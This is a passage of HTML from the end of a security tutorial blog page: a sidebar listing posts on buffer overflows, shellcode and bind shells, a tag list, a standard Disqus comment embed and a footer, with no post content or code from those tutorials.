    <li><a href="https://bad-hombres.github.io//blog/2018/11/01/Buffer-Overflow-Level-2.html">Buffer Overflows: Level 2 (ret2libc)</a></li>
    
    <li><a href="https://bad-hombres.github.io//blog/2017/03/21/SLAE-TCP-Bind-Shell.html">SLAE: TCP Bind Shell</a></li>
    
    <li><a href="https://bad-hombres.github.io//blog/2016/11/03/Buffer-Overflow-Level-1.html">Buffer Overflows: Level 1 (ret2stack)</a></li>
    
    <li><a href="https://bad-hombres.github.io//blog/2016/11/02/Crafting-Shellcode.html">Crafting Shellcode</a></li>
    
    <li><a href="https://bad-hombres.github.io//blog/2016/11/01/Format-Strings.html">Format Strings</a></li>
    
  </ul>
</div>

<div class="sidebar">
  <h2>Tags</h2>
  <ul>
    
      <li><a href="https://bad-hombres.github.io//blog/tag/tools">tools</a></li>
    
      <li><a href="https://bad-hombres.github.io//blog/tag/linux">linux</a></li>
    
      <li><a href="https://bad-hombres.github.io//blog/tag/exploit">exploit</a></li>
    
      <li><a href="https://bad-hombres.github.io//blog/tag/32bit">32bit</a></li>
    
      <li><a href="https://bad-hombres.github.io//blog/tag/shellcode">shellcode</a></li>
    
      <li><a href="https://bad-hombres.github.io//blog/tag/assembly">assembly</a></li>
    
      <li><a href="https://bad-hombres.github.io//blog/tag/bufferoverflow">bufferoverflow</a></li>
    
      <li><a href="https://bad-hombres.github.io//blog/tag/slae">slae</a></li>
    
  </ul>
</div>

        </div>
      </div>
    </div>
    
<!-- Add Disqus comments. -->
<div id="disqus_thread"></div>
<script type="text/javascript">
  /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
  var disqus_shortname = 'bad-hombres'; // required: replace example with your forum shortname
  var disqus_identifier = "/2016/11/03/Buffer-Overflow-Level-1.html";

  /* * * DON'T EDIT BELOW THIS LINE * * */
  (function() {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>


  </div>
      <footer class="footer-distributed">
      <div class="container">
        <div class="footer">
          <p>Bad Hombres &copy; 2017</p>
          <h6>Follow us</h6>

<ul class="social-media">

  
    <li>
      <a title="bad-hombres on Github" href="https://github.com/bad-hombres" target="_blank"><i class="fa fa-github fa-2x"></i></a>
    </li>
  

  

  

  

  

  
    <li>
      <a title="feed.xml RSS" href="/blog/feed.xml" target="_blank"><i class="fa fa-rss fa-2x"></i></a>
    </li>
  

</ul>


          <p> Original theme from <a href="https://github.com/streetturtle/jekyll-clean-dark">Here</a>
        </div>
      </div>
    </footer>
  </body>
</html>

</div>
